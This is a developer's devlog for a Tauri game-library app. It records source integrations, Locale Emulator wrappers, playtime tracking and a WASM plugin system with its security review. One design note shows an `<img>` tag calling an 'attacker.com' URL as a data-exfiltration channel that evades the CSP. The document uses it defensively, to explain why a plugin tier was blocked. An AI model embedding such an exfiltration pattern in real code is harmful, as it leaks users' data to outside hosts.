# Devlog

Detailed implementation history, rationale, and fixes behind every item in
`.claude/milestones.md`. Milestones.md tracks *what's done*; this tracks *why/how*. No
checkboxes here - this is a log, not a tracker. Same headings as milestones.md for
cross-reference.

## Milestone 7 — Polish & Extras
- List view for desktop UI (proposal calls for "grid and list views"; only grid existed before this)
- Metadata provider plugin support — swap IGDB for another source (proposal's "Other Plugin Candidates"); needed a new plugin `kind` (`"metadata"`) alongside `source`/`theme`, following the same manifest/loader pattern
- Controller mapping profile plugins — custom gamepad button/axis mappings, distinct from the previously-hardcoded `useGamepadNav` bindings (proposal's "Other Plugin Candidates")
- Background art on focus (Big Picture) — background art only; trailer preview stayed out of scope (proposal marks it "(stretch)" within an already-stretch item, and needs a separate trailer-source integration nothing here provides)
- Additional source plugins:
  - Epic Games — parses `%PROGRAMDATA%\Epic\EpicGamesLauncher\Data\Manifests\*.item` JSON (verified against Playnite's EpicLibrary source, since Epic doesn't document the format), launches via `com.epicgames.launcher://apps/{AppName}?action=launch&silent=true`. Verified end-to-end against a real Epic install (Fortnite): scan and launch both work. Required adding `{"identifier": "opener:allow-open-url", "allow": [{"url": "com.epicgames.launcher:*"}]}` to `capabilities/default.json` (same class of fix as the earlier Steam URI scope issue)
  - GOG — enumerates `HKLM\SOFTWARE\WOW6432Node\GOG.com\Games\{gameID}` (gameName/path values), launches via `GalaxyClient.exe /gameid {id} /command runGame` (verified against tkashkin/GOGWrapper source - GOG has no registered URI scheme, so this is a direct process spawn with args, not `openUrl()`). Pseudo-URI `gog://{gameId}` used in `executable_path` purely to route `launchGame()` to `invoke("launch_gog_game", ...)` instead of `openUrl()`. Verified end-to-end against a real GOG install: scan and launch both work
  - Emulator/ROM scanner — not yet done
- Big Picture scroll fixes: hid visible scrollbars in Big Picture mode (console-UI aesthetic, still scrollable via gamepad/keyboard `scrollIntoView`, just not visually shown), and stopped the underlying desktop page from scrolling along with it - Big Picture is a `position: fixed` overlay on top of `<main>`, but the desktop page behind it was still scrollable, so mouse-wheel input while Big Picture was open scrolled the hidden desktop content instead of staying scoped to the overlay. Fixed by locking the desktop page's scroll (e.g. `overflow: hidden` on `<body>`/`<html>`) while `bigPicture` is active, restored on close
- Auto-launch into Big Picture on boot (toggle)
- Per-game compatibility wrappers via [Locale Remulator](https://github.com/InWILL/Locale_Remulator) + [Locale Emulator](https://github.com/xupefei/Locale-Emulator) (both LGPL-3.0) — LR preferred as primary (LE is archived/32-bit-only), LE added as a fallback after real-world testing found a game LR couldn't get past its startup popup on (reproduced identically launching LR directly, no app involved - a genuine LR compatibility gap, not our integration) that LE ran fine
  - Plan revised twice: first from "bundle as a Tauri sidecar" (both need their own installer + GUI-created locale profiles, not a portable exe to bundle - same category as "assume Steam/GOG client is already installed"), then again after testing against real releases: both actually ship as portable folders (extract the zip anywhere), and their installers only register a right-click context-menu extension, not a discoverable app install - confirmed via registry inspection that neither writes an "App Paths"/Uninstall entry or dedicated key anywhere, so true auto-detection isn't possible for either
  - Global path settings in `AppSettings` for both (`appSettings.localeRemulatorPath`/`localeEmulatorPath`, mirrors the SGDB-API-key settings pattern), validated via the shared `locale_remulator.rs::wrapper_path_exists` — verified working against real extractions of both
  - `games.locale_profile_guid` + `games.locale_wrapper` (migrations v5/v6) — per-game opt-in via a GUID from `LRConfig.xml`/`LEConfig.xml` (same `Name`/`Guid` shape, LE is the project LR forked from), `locale_wrapper` (`"lr" | "le"`) disambiguates which tool the GUID belongs to since neither namespaces against the other. `EditGameModal` presents both profile lists in one `<select>`, split into `<optgroup>`s per wrapper
  - `launcher.rs::launch_via_locale_remulator` spawns `LRProc.exe <guid> <path>`; `locale_emulator.rs::launch_via_locale_emulator` spawns `LEProc.exe -runas <guid> <path>` (different CLI shape - LE needs the `-runas` flag before the guid, bare positional args run the target's own per-app profile instead)
  - Playtime fallback — neither wrapper's exit behavior after handing off to the hooked game is confirmed, so (like the URI-based sources) tracking falls back to `track_folder_playtime` using `install_dir` or the executable's parent folder
  - End-to-end verification — wrapper plumbing confirmed correct for both (`LRProc.exe`/`LEProc.exe` spawn, hook, and show the expected pre-game popup). The one test game hung past that popup under LR (both non-admin and admin profiles) but ran fine under LE; no code-side fix available for the LR gap short of the "build our own hook engine" approach already rejected as not worth the reverse-engineering/AV-risk cost
- Playtime tracking for URI-launched games (Steam/Epic/GOG) — implemented Playnite-style "Folder" tracking: `games.install_dir` (migration v4) records each entry's known install folder (Steam: `library_path/steamapps/common/<installdir>`, Epic: manifest `InstallLocation`, GOG: registry `path`). `launcher.rs::track_folder_playtime` (uses `sysinfo`) polls the running-process list every 3s, treats any process whose exe path falls under the normalized install folder as "the game is running", and emits the same `game-session-ended` event `launch_game` does once no matching process remains (2-poll grace period to survive launcher-to-game handoff; gives up quietly if nothing matches within 120s). `library.ts::launchGame` fires this after a URI-based launch whenever `install_dir` is known. Not Steam-specific - generalizes to any future protocol-launched source plugin. Verified end-to-end: a real play session gets recorded. Separately, historical playtime accumulated before this app was ever used could still be imported via Steam's `IPlayerService/GetOwnedGames` Web API (`playtime_forever`), tracked as a future stretch, not done

## Milestone 8 — Remote/Downloadable Plugins (future)
**Pivoted to WASM.** Original plan was a pasted-URL zip download containing a pre-built JS module, loaded via `convertFileSrc` + runtime `import()`. Investigating that surfaced a hard limit: Tauri compiles Rust `#[tauri::command]`s statically into the binary, so JS-bundle plugins can only *recombine already-existing* Tauri commands (e.g. `find_steam_apps`) - they can't introduce a genuinely new native capability without either (a) native dylib loading via `libloading`, which is unsandboxed arbitrary code execution at the OS level, far beyond the "same privilege as the app" risk already accepted for JS plugins, or (b) WebAssembly, which is what Zed does for its extensions: plugin code compiles to `.wasm`, runs in a real memory-sandboxed runtime embedded in the host, and can *only* call back into host functions the app explicitly exposes - genuine new-capability-per-plugin without the native-dylib risk. Chose (b).
- Embed a WASM runtime (`wasmtime`, Component Model) in `src-tauri`; define a WIT "world" per plugin kind, starting with `SourcePlugin` (`scan`/`launch`/`getInstallStatus`) — `wit/plugin.wit` defines the `host` import interface (registry/file/process/network primitives + scoped `settings`/`plugin-data` storage) and `source-plugin` export interface (mirrors the TS `SourcePlugin` contract); `wasm_plugins.rs` uses `wasmtime::component::bindgen!` to generate matching Rust bindings, confirmed compiling
- Host-function capability surface — generic primitives (registry read, file read/list, process spawn, HTTP fetch) exposed to WASM plugins. This is a deliberate shift: instead of writing a bespoke Rust module per integration (`steam.rs`, `gog.rs`, ...), a WASM plugin does its own VDF/XML/JSON parsing and composes these primitives itself. Implemented in `wasm_plugins.rs`'s `Host` impl: `read-registry-string` reuses the same `winreg` pattern as `steam.rs`/`gog.rs`; `spawn-process` is fire-and-forget like every other launcher path in this app; `http-get` uses `reqwest::blocking` rather than the async client used elsewhere (`sgdb.rs`/`igdb.rs`), since wasmtime component calls are synchronous - this must only ever run from a blocking context (e.g. `spawn_blocking`), never directly on the async runtime thread
- DB access stays host-owned, never raw SQL — no plugin gets direct access to `games`/`tags`/`playtime_sessions`; a malicious/buggy plugin could corrupt shared data, and hardcoded SQL against our schema would break on every migration (schema ownership is locked to versioned migrations in `db.rs` per `CLAUDE.md`). `scan()`/`fetchMetadata()` etc. return structured data, and the host's existing repository code (`GameRepository`, ...) does the actual writes, same as the TS plugins. Plugins that need to persist their own data get two scoped host functions instead of table access: `settings-get`/`settings-set` (existing generic `settings` table, key auto-prefixed with the plugin's own id via `PluginHostState::namespaced_settings_key`) and a new generic `plugin_data(plugin_id, game_id, key, value)` table (migration v7) with matching `plugin-data-get`/`plugin-data-set` functions. Implementation note: since `Host` trait methods run synchronously deep inside wasmtime execution with no path back to the frontend's async `tauri-plugin-sql` connection, `PluginHostState` opens its own Rust-side `rusqlite` connection to the same `library.db` file - multiple connections to one SQLite file is standard/safe, this doesn't change the app's frontend-owned DB architecture, it's purely how the host functions themselves reach the file
- Download command (paste a URL, matches the earlier UX decision) — `wasm_plugin_installer.rs::install_wasm_plugin` fetches a zip bundle (`plugin.json` + a `.wasm` entry, same shape as `src/plugins/<id>/plugin.json`) via `reqwest`, optionally verifies a pasted SHA256 (protects against a corrupted/tampered download, not against a malicious bundle - the SHA256 doesn't protect against trusting a bad source, see the plugin-privilege note below), extracts to a staging dir, reads the id out of `plugin.json`, then renames into `<app data>/wasm-plugins/<id>/`
- Tauri commands to load/instantiate a `.wasm` module against the host-function surface and invoke its exports; frontend calls through these rather than talking to plugin code directly — `wasm_plugin_runtime.rs`'s `wasm_plugin_scan`/`wasm_plugin_launch`/`wasm_plugin_get_install_status` mirror the three `SourcePlugin` methods, each instantiating the component fresh (cheap relative to how infrequently these run - user-triggered, not a hot path) inside `spawn_blocking`. `WasmGameEntry`/`WasmGameEntryInput` DTOs convert to/from the bindgen-generated `GameEntry` record rather than deriving `Serialize` on it directly, keeping the wire format decoupled from bindgen's derive support. The Component Model bindgen surface (`SourcePluginWorld::instantiate`, `gamelib_plugin_source_plugin()`, `call_scan`/`call_launch`/`call_get_install_status`) compiled correctly on the first pass
- Loader integration — the manifest/loader system recognizes a `"wasm"` entry alongside build-time TS entries, and presents it to stores/components as an ordinary `SourcePlugin` so existing call sites (`GameGrid`, `library.ts`) don't need to know the difference. `PluginManifest` gained an optional `runtime?: "ts" | "wasm"` field; `list_wasm_plugins` (Rust command in `wasm_plugin_installer.rs`) scans `<app data>/wasm-plugins/*/plugin.json` and returns them the same shape as build-time manifests. `loader.ts::getAvailablePluginManifests` became async (all 4 call sites - `plugins`/`theme`/`metadataProviders`/`controllerMapping` stores - already awaited it inside their own async `init()`, so this was a contained change) and merges installed WASM manifests alongside the Vite-discovered ones, restricted to `kind === "source"` since the WIT world only exports `SourcePlugin`. `loadPlugin` branches on `runtime === "wasm"` and returns a thin wrapper (`createWasmSourcePlugin`) whose `scan`/`launch`/`getInstallStatus` just call the `wasm_plugin_runtime.rs` Tauri commands - added `#[serde(rename_all = "camelCase")]` to the Rust-side `WasmGameEntry`/`WasmGameEntryInput` DTOs so their wire shape matches the TS `GameEntry` interface exactly, no manual field-name mapping needed either side
- Reference example — `examples/exe-scanner-plugin/` (standalone `cargo-component` crate, not part of the main workspace) implements `source-plugin-world`: `scan()` reads a `scan_dir` setting via `settings-get`, lists it via `list-dir`, filters `.exe` files; `launch()`/`getInstallStatus()` call `spawn-process`/`path-exists`. Required installing the `wasm32-wasip1` Rust target and `cargo-component` (neither present before this milestone). Building it against the WIT surfaced one real gap: `cargo-component`'s `wasm32-wasip1` target imports baseline `wasi:cli/*` interfaces even for a capability-less "reactor" component that never touches real WASI filesystem/env - fixed by also linking `wasmtime-wasi` with a bare, no-preopens `WasiCtx` (the guest still never gets real WASI access, only our own `host` interface). `wasm_plugin_runtime.rs::instantiate` was split into a Tauri-free `instantiate_from_paths` specifically so this could be a real `#[test]` - it loads the actual compiled `.wasm`, instantiates it, calls `scan()`, and asserts on real `GameEntry` results round-tripped across the component boundary. Test passes: `cargo test wasm_plugin_runtime` (from `src-tauri/`, after `cd examples/exe-scanner-plugin && cargo component build`)
- Revisited `tauri.conf.json` CSP (`csp: null` before) - simpler than the original plan's story, since this no longer involves loading remote JS/`import()` through the webview at all; WASM execution happens Rust-side via `wasmtime`. Set to `default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; connect-src ipc: http://ipc.localhost`. Confirmed via grep that no frontend code calls `fetch`/`XMLHttpRequest`/`WebSocket` directly - every external API call (SteamGridDB, IGDB, wrapper/plugin downloads) happens server-side in Rust via `reqwest`, so `connect-src` only needs Tauri's own IPC channel, no external hosts. `img-src` allows `https:` broadly since cover/background art URLs are arbitrary external CDN URLs. `style-src` needs `'unsafe-inline'` for `BigPictureGrid.vue`'s dynamic `:style="{ backgroundImage: ... }"` binding. Verified in a running app (`bunx tauri dev`) - no CSP violations, cover art/background art/Big Picture backdrop all render correctly
- (Stretch) Migrate one existing built-in integration to a WASM plugin as a real-world proof — done for Steam
  - Genuinely separate repo (`steam-source-wasm-plugin`, local-only for now, sibling to this project on disk), not inside this one — a plugin whose source lives in the host app's own repo doesn't really exercise the "install arbitrary third-party code" model
  - Ported `steam.rs`'s VDF parsing/registry lookup/appmanifest scanning logic as-is (pure string/data parsing, no changes needed), every OS touchpoint swapped for the corresponding `host::` call
  - Installed manually into `<app data>/wasm-plugins/steam-wasm/` and scanned against a real Steam install — found the same games as the built-in plugin. Confirmed the whole pipeline (WIT contract, host functions, loader integration, install-by-copying-files) holds up for a real integration, not just the synthetic exe-scanner reference
  - Built-in `steam.rs`/`src/plugins/steam/index.ts` removed (and the now-unused `keyvalues-parser` dependency dropped from `src-tauri/Cargo.toml`) once the WASM version was confirmed working — the WASM plugin kept its `steam-wasm` id rather than renaming to `steam`, since renaming would silently desync anyone's already-persisted `enabled_plugins` setting
  - Migrating `games.install_dir`'s Steam usage into `plugin_data` — **won't-do**. `install_dir` is a shared, generic column every source plugin (Steam/Epic/GOG, WASM or TS) populates through the same path (`scan()` → `importEntries()` → `games.install_dir`), and `launchGame()`'s folder-based playtime tracking reads it back the same way regardless of which plugin produced the row - `steam-wasm` already participates in this correctly with zero special-casing. Migrating only Steam's slice into `plugin_data` would force `launchGame()` to special-case "if this game came from `steam-wasm`, look elsewhere" - reintroducing per-plugin awareness into the one place that's deliberately plugin-agnostic today, for no functional gain, and leaving Epic/GOG on the old column while Steam alone uses the new one. A uniform migration for *all* source plugins would be a coherent alternative but is real scope, not a small follow-up - tracked in Milestone 9 if ever wanted
- Install-by-URL, redesigned and finally wired to real UI - the original `install_wasm_plugin` (paste a zip URL, optional SHA256) was written this milestone but never actually called from the frontend; steam-source-wasm-plugin's own CI (added later, publishes `plugin.json` + the compiled `.wasm` as two plain sibling release assets, not a zip) made the old zip-shaped contract wrong anyway. Redesigned: `fetch_wasm_plugin_manifest(url)` fetches and parses just the manifest first; `install_wasm_plugin(app, manifest_url)` derives the sibling `.wasm` URL (same directory, filename = the manifest's own `entry` field) and downloads/writes both files - no zip, no checksum param (dropped the now-unused `sha2` dependency along with it). Frontend: `AddPluginModal.vue` (already generic, built earlier for the data-theme install-by-URL flow) reused unchanged for the Source tab's "Add Plugin" button; a new `ConfirmInstallModal.vue` shows the fetched id/name/version/kind and asks for confirmation before the actual `.wasm` download happens, wired into a new `plugins.ts` preview/confirm/cancel flow (`previewInstall` rejects non-`"source"`-kind manifests early)
- Real security gap found while designing that confirm dialog's warning copy - it's not accurate to call this "sandboxed" in any protective sense. Checked `wasm_plugins.rs`'s actual host-function implementations: `read-file`/`write-file`/`remove-dir`/`list-dir`/`path-exists`/`spawn-process`/`run-and-wait`/registry reads all take a caller-supplied path/executable with **zero scoping** - a plugin can read/write/delete anywhere the OS account can reach, or spawn any executable with any args. wasmtime's sandbox only guarantees memory-safety (can't corrupt host memory, can't escape linear memory) - it says nothing about what the *exposed host functions themselves* are allowed to do, and none of them are currently capability-restricted. Net: installing a WASM plugin from an untrusted URL today carries the same real-world risk as running an arbitrary downloaded `.exe` - the WASM boundary doesn't reduce that. Two real mitigations identified (see Milestone 12) - not implemented yet, so for now the confirm modal's copy was corrected to say so honestly instead of overclaiming protection, and the same caveat was added to the main README
- `wasm-plugins/` reorganized by kind - was a flat `<app data>/wasm-plugins/<id>/`, regardless of whether the plugin was a source or wrapper kind; now `<app data>/wasm-plugins/<kind>/<id>/`. `install_wasm_plugin` picks the subfolder from the manifest's own `kind` field, validated against a `SUPPORTED_KINDS` allowlist (`["source", "wrapper"]`, the only two WIT worlds that exist) first - `kind` is remote-controlled input that ends up as a path segment, so this also closes a path-traversal opening a crafted manifest could otherwise use. `list_wasm_plugins` scans each known kind subfolder instead of one flat directory. `wasm_plugin_runtime.rs`'s `plugin_dir()` gained a `kind` parameter, hardcoded per call site (`instantiate()` always resolves `source/`, `instantiate_wrapper()` always resolves `wrapper/`) rather than threaded from the frontend, since each Tauri command already only ever operates on one kind by construction. A real install from earlier testing (`wasm-plugins/steam-wasm/`, flat) was migrated by hand into the new `wasm-plugins/source/steam-wasm/` location rather than left to silently disappear from `list_wasm_plugins`'s output. Updated every WASM plugin repo's README install-path instructions and each repo's own copy of `wit/plugin.wit`'s `plugin-dir()` doc comment to match (doc-only in the WIT files - doesn't affect bindgen output, no rebuild needed on their end)

## Milestone 9 — Further WASM Adoption (stretch)
Natural follow-ups from Steam's real-world WASM migration, none required for anything else in this project - purely optional further adoption of the pattern now that it's proven end-to-end.
- Uniform `games.install_dir` → `plugin_data` migration for *all* source plugins — revisited and closed as **won't-do**, not just deferred. Two separate problems, not one: (1) `plugin_data` rows are namespaced by `plugin_id` and get cleaned up in one statement on uninstall (`db.rs`'s own doc comment on the table) - `install_dir` is core library metadata read back by `launchGame()`'s folder-based playtime tracking for every game regardless of which plugin (if any) sourced it, and a game row outlives the plugin that created it (uninstalling a source plugin never deletes the games it imported). Moving `install_dir` into `plugin_data` would silently break playtime tracking for already-imported games the moment their source plugin gets uninstalled - the opposite of what the current design guarantees. (2) Even setting that aside, `games` has no column recording which plugin produced a row (only a free-text `platform` string, not reliably 1:1 with a plugin id - e.g. built-in `steam` vs `steam-wasm`), so a uniform migration would first need to *add* a column just to know which `plugin_data` bucket to look in for a given game - net more moving parts for a lookup that costs zero special-casing today. `install_dir` stays a core `games` column
- Migrate GOG to a WASM plugin in its own separate repo (`gog-source-wasm-plugin`), same shape as `steam-source-wasm-plugin` — id `gog-wasm`, verified against a real GOG install (scan + launch both work). Needed one new host primitive Steam's port never required: `list-registry-keys` (enumerate registry *subkey names*), since GOG stores each installed game as its own subkey under `GOG.com\Games\`, unlike Steam's single named-value reads — added to the shared `wit/plugin.wit` host interface and `wasm_plugins.rs`, confirmed purely additive (the existing `exe-scanner-plugin` test still passes against the updated host)
  - Retired the built-in the same way Steam's was, once `gog-wasm` had been confirmed working against a real install (not just compiled): `src/plugins/gog/` (the TS `SourcePlugin`) deleted outright, `gog.rs` trimmed to just `launch_gog_game`. `find_gog_apps` (the scanning logic) is gone - fully redundant with `gog-wasm`'s registry scan - but `launch_gog_game` stays, since it's host-level dispatch `library.ts` calls directly for any `gog://`-prefixed `executable_path` regardless of which plugin scanned the game (GOG has no OS-registered URI scheme the way Steam/Epic do, so there's no `openUrl()` equivalent to fall back to). No `enabled_plugins` desync risk this time - the live settings already only had `gog-wasm` enabled, not the built-in `gog`, so nothing to migrate
  - Migrate Epic to a WASM plugin in its own separate repo (`epic-source-wasm-plugin`), same shape as Steam/GOG — id `epic-wasm`. Simpler port than GOG: Epic writes one `*.item` JSON manifest per installed game to `%PROGRAMDATA%\Epic\EpicGamesLauncher\Data\Manifests`, no registry involved at all, so no new host primitives were needed (`list-dir`/`read-file` already covered it). `%PROGRAMDATA%` is hardcoded to `C:\ProgramData` rather than read via an environment variable - a fixed Windows system directory not worth a new `env-var` host primitive for, same reasoning as Steam's own hardcoded install-path fallback. Epic's `launch()` is dead code same as Steam's, for the same reason: it has a real OS-registered URI scheme (`com.epicgames.launcher://`), so `library.ts`'s generic `openUrl()` dispatch handles it directly, never calling into either plugin's own `launch()`
    - Verification initially came in two parts, weaker than Steam/GOG's: the manifest-parsing logic is pure Rust (no `host::` calls), so it got its own `cargo test` suite using the exact real manifest field shape `epic.rs`'s own test already used (confirmed against Playnite's `EpicLibrary` source, same as the original built-in). The compiled component itself was verified to instantiate and `scan()`/`getInstallStatus()` cleanly against the real live `%PROGRAMDATA%` path - but at that point this machine had zero Epic games installed, so the real end-to-end check could only confirm "runs cleanly, finds nothing" rather than "finds the same real games as the built-in version," and `epic.rs`/`src/plugins/epic/` were left coexisting as a result
    - Closed the gap once a real game was available: installed a real game via Epic Games for exactly this purpose, re-ran the real end-to-end check, and this time `scan()` found it for real (its display name came back localized in Epic's Korean client, not English - the test asserts on the stable app-id-bearing URI rather than the title string for exactly this reason) with `getInstallStatus()` correctly reporting it installed. Built-in `epic.rs`/`src/plugins/epic/` retired immediately after, same as Steam/GOG - `epic.rs` deleted outright (no equivalent to GOG's `launch_gog_game` was ever needed, since Epic's real `com.epicgames.launcher://` URI scheme was always handled by `library.ts`'s generic `openUrl()` dispatch, nothing host-specific left over once scanning moved to the WASM plugin)
  - GOG's `gog.rs` retirement (above) initially kept `launch_gog_game` host-side, reasoning that GOG "has no OS-registered URI scheme the way Steam/Epic do." That turned out to be half-true: GOG Galaxy *does* register `goggalaxy://` (confirmed via a real registry check: `HKCU\Software\Classes\goggalaxy\shell\open\command` → `GalaxyClient.exe /urlProtocol="%1"`, set up by GOG Galaxy's own installer, same mechanism as Steam/Epic). But its game-launch argument grammar isn't publicly documented anywhere, and a known community reference implementation (`GOGWrapper`) doesn't use it to launch a specific game either - it uses the same direct `/gameid <id> /command runGame` CLI form this project already relies on. Switching to the URI would mean trading a confirmed-working mechanism for an unverified one, for no real benefit, so it wasn't pursued
    - What *did* change: `gog-wasm`'s `launch()` was dead code (like Steam/Epic's) only because `library.ts` bypassed it entirely in favor of a dedicated `launch_gog_game` Tauri command. Made it real instead - `gog-wasm`'s `launch()` now resolves `GalaxyClient.exe`'s path via the registry itself (mirroring `gog.rs`'s now-removed `gog_galaxy_client_dir_from_registry`) and spawns it directly via `host::spawn-process`, no new host primitives needed. `library.ts`'s `"gog://"` branch now calls `invoke("wasm_plugin_launch", { pluginId: "gog-wasm", entry })` (reconstructing a `GameEntry` from the DB row) instead of the dedicated command - `gog.rs` is now fully empty and was deleted outright, same end state as `steam.rs`. Verified for real: scanned a real installed GOG game, called `launch()`, confirmed `GalaxyClient.exe` (plus its helper processes) actually started - not just "no error returned"
- **External theme plugins, data-only tier.** `ThemePlugin` already splits cleanly into two capability tiers: `cssVariables` (a flat string map, pure data) and `slots` (real Vue component overrides for `GameCard`/`BigPictureTile`). The `slots` tier can't ever be externalized - a WASM component can only export typed data/functions, never a renderable Vue component, same wall `Installable` hit for settings UI. The `cssVariables` tier has no such problem: it's just data, so it doesn't even need WASM/wasmtime - no code to sandbox at all. New `data_theme_installer.rs`: `install_data_theme(url)` downloads a JSON manifest (`{id, name, version, cssVariables}`) from a user-pasted URL and caches it at `<app data>/data-themes/<id>/theme.json`, `list_data_themes()`/`uninstall_data_theme(id)` round it out - no checksum/size check the way binary installs get, since the worst case here is a bad CSS value, not code execution
  - `manifest.ts`'s `runtime` union gained a third value, `"data"`, alongside `"ts"`/`"wasm"` - and `PluginManifest` gained an optional `cssVariables` field, since a data-theme manifest carries its entire content inline (no separate compiled/bundled entry to load). `loader.ts` gained `getInstalledDataThemeManifests()` (parallel to `getInstalledWasmManifests`, merged into `getAvailablePluginManifests`) and a `createDataThemePlugin()` factory that's nearly trivial - the manifest already has everything a `ThemePlugin` needs, no separate invoke required per instance the way WASM plugins need one call per method
  - `theme.ts` gained `installDataTheme(url)`/`uninstallDataTheme(id)`, and `PluginSettings.vue`'s Theme tab gained a URL input + Install button (below the theme list) plus a per-row "Remove" button for any `runtime: "data"` entry. Uninstalling the currently-active theme falls back to the default (`catppuccin-latte`) rather than leaving the app on a theme that no longer exists
  - `install_data_theme_to`/`list_data_themes_from`/`uninstall_data_theme_from` were split out `AppHandle`-free (same pattern as `wasm_plugin_runtime.rs`'s `instantiate_from_paths`) specifically so the happy path could be a real test rather than a compiles-clean check. Since there's no long-lived external resource to hit the way GitHub's API is for the wrapper/WASM-plugin installers, the test spins up its own single-request HTTP/1.1 responder on an OS-assigned localhost port (hand-rolled over `std::net::TcpListener`, no new dependency) - a real `reqwest` HTTP round-trip against a real (if minimal) server, not a mocked response, while staying fully self-contained and reproducible without any manual setup or network access
  - **Component-override tier (`slots`) reviewed, found blocked.** Re-checked whether the reasoning above ("can't ever be externalized") still held, given how much the plugin system had grown since it was first written - it does, and worse than expected. Two candidate mechanisms:
    - **WASM export** - still structurally impossible, not just impractical. The Component Model can only cross typed functions/data (numbers, strings, records) over the host-guest boundary; a Vue component is a live object graph (render function, reactive `setup()`, lifecycle hooks) that has no representation on that boundary at all. No new WIT primitive or world design closes this - it's the same category of wall `Installable`-for-WASM already hit for settings UI, just for component rendering instead of config collection.
    - **Raw remote JS instead, bypassing WASM entirely** - this was in fact the *original* Milestone 8 plan before the pivot to WASM, and the reason for that pivot (`#[tauri::command]`s compile statically, so a JS-bundle plugin could only recombine capabilities the host already exposes, never add a new one) doesn't really bite here, since a theme component only renders `game` prop data it's already handed - no new native capability needed. But the security profile is a regression, not a wash: no memory-safety sandbox at all (same JS realm as the whole app, not an isolated one), full access to every already-exposed Tauri command rather than a narrow `host::` surface, and direct read/write access to every Pinia store in memory. The current CSP's `connect-src` lockdown (`ipc: http://ipc.localhost` only) would block a naive `fetch`-based exfil, but `img-src` still allows arbitrary `https:` - an `<img src="https://attacker.com/leak?data=...">` still works as a channel out even under today's CSP.
    - Verdict: closing this out as reviewed-and-blocked rather than leaving it open-ended. Pursuing the JS-bundle route now would mean shipping a *less* constrained install-by-URL tier while the WASM one's own capability-sandboxing gap (Milestone 12) is still unresolved - a bigger regression, not a smaller one.
    - **Moved to Milestone 16 (Post-1.0 Roadmap).** The blocking condition named above - Milestone 12's sandboxing gap being open - no longer holds; both Milestone 12 and 14 have since closed. Rather than silently leave a stale "blocked" verdict sitting inside an otherwise fully-closed Milestone 9, split it out as its own tracked Post-1.0 item so the now-outdated premise gets revisited on its own rather than assumed to still apply.
    - **Revisited the "genuinely safe alternative" against a real precedent.** Playnite - a mature, established app solving the exact same problem in this exact product category - was checked for how it handles theme customization deeper than plain color/CSS values. Its answer: themes are `.xaml` files (WPF's declarative UI markup), parsed and rendered by WPF's own engine, never compiled/executable code - confirms the earlier "constrained declarative card template" idea isn't a hypothetical, it's the pattern mature game-library-manager theme systems actually converge on once CSS alone isn't enough. Sharper framing than originally noted: this doesn't need to be built from scratch as "a small template engine" - Vue itself already ships a runtime template compiler (`@vue/compiler-sfc`/full-build Vue) that compiles a plain *string* of Vue template syntax into a render function at runtime, no `import()` of arbitrary JS involved at all. That's Concourse's direct equivalent of XAML, already available in a dependency already in use. The real remaining design work if this is ever pursued is scope, not tooling - the compiled template's expression scope would need to be tightly whitelisted to `game` fields plus known formatting helpers, not the ambient app context, since unrestricted `{{ }}` interpolation can still call whatever's in scope. Still not proposed for implementation now - this only upgrades the alternative from speculative to concretely buildable with tooling already on hand, it doesn't reopen the "blocked" verdict for the existing `slots` tier itself
    - **Scope note on what "importing Vue" for this would actually mean**, since it's not obvious upfront. `@vitejs/plugin-vue` precompiles every `.vue` file at build time (`@vue/compiler-sfc` runs in Node, never ships to the browser), so the app currently only bundles Vue's *runtime* (reactivity + renderer + `h`) - nothing needs to compile a template string post-build today. Runtime-compiling a theme-provided template string would need exactly one missing piece added: `@vue/compiler-dom`'s `compile()`. Not a second Vue instance - Vue's packages (`reactivity`/`runtime-core`/`runtime-dom`/`compiler-dom`) are modules of one versioned whole, so adding `compiler-dom` just plugs the missing piece into the runtime already loaded, same `h`/component model/reactivity, no duplication, as long as the version matches exactly. Should be lazy (`import('@vue/compiler-dom')` only when a plugin actually declares a template override, code-split out of the main bundle), not bundled unconditionally for users who never install one. Also worth being precise about, not overclaiming: `{{ }}` interpolations aren't inert data placeholders once compiled - they're real evaluated JS expressions against whatever's exposed on the render context. Not equivalent to raw JS `import()` (no arbitrary statements, no module loading, no reaching `window`/`document` unless explicitly put in scope), but not zero-JS-execution either - the actual security property comes entirely from how tightly that exposed scope gets whitelisted, not from the compiler mechanism itself
- Rename `steam-wasm` → `steam` cleanly, if ever wanted, including a one-time migration for anyone's already-persisted `enabled_plugins` setting so it doesn't silently desync (not done as part of the initial migration - see Milestone 8's note) - **resolved differently.** Revisited once every WASM plugin (not just Steam) had accumulated the same cosmetic issue: `plugin.json`'s `name` field still said "Steam (WASM)"/"GOG (WASM)"/etc., a suffix that only ever meant "disambiguate from the coexisting built-in during migration/comparison" - now meaningless since every built-in (`steam.rs`, `gog.rs`, `epic.rs`, `sgdb.rs`, `igdb.rs`) is fully retired, and LR/LE never had one to begin with. Explicitly chose *not* to touch `id` (`steam-wasm`, `gog-wasm`, etc. all stay as-is) - that's the part with real migration risk (`enabled_plugins`/`active_theme_id`-style persisted settings reference ids, not names), and nothing about the display text needed it. Dropped "(WASM)" from `name` across all 7 plugin repos (`steam-source-wasm-plugin`, `gog-source-wasm-plugin`, `epic-source-wasm-plugin`, `sgdb-metadata-wasm-plugin`, `igdb-metadata-wasm-plugin`, `locale-remulator-wasm-plugin`, `locale-emulator-wasm-plugin`), bumped each to `0.1.1` (patch - cosmetic manifest field, no behavior/compatibility change) in both `plugin.json` and `Cargo.toml`. `.wasm` binaries themselves untouched (manifest is read from disk separately, never embedded in the compiled component), so no rebuild was needed - just re-verified each repo's `Cargo.toml` still parses (`cargo check`) and every edited `plugin.json` is still valid JSON
- **SteamGridDB/IGDB migrated to WASM plugins.** Both needed real new infrastructure first, not just a port - unlike Steam/GOG/Epic (which already fit `SourcePlugin` cleanly), these surfaced two genuine gaps:
  - **HTTP capability gap.** The existing `http-get: func(url: string) -> result<string, string>` has no way to send custom headers or a non-GET method - SteamGridDB needs `Authorization: Bearer <key>`, IGDB needs a Twitch OAuth POST plus a POST-based query API with a `Client-ID` header and a raw Apicalypse body. Added a general `http-request(method, url, headers: list<tuple<string, string>>, body: option<string>)` primitive rather than narrow single-purpose functions - `headers` uses a plain tuple list instead of a named record specifically to avoid the "bindgen only generates record types a world's exports reference" issue that already forced two independent `bindgen!` invocations for `source-plugin-world`/`wrapper-plugin-world`. `do_http_request` in `wasm_plugins.rs` still sends the same default `User-Agent: concourse` base header, overridable per-call since `reqwest` takes the last `.header()` call for a given name
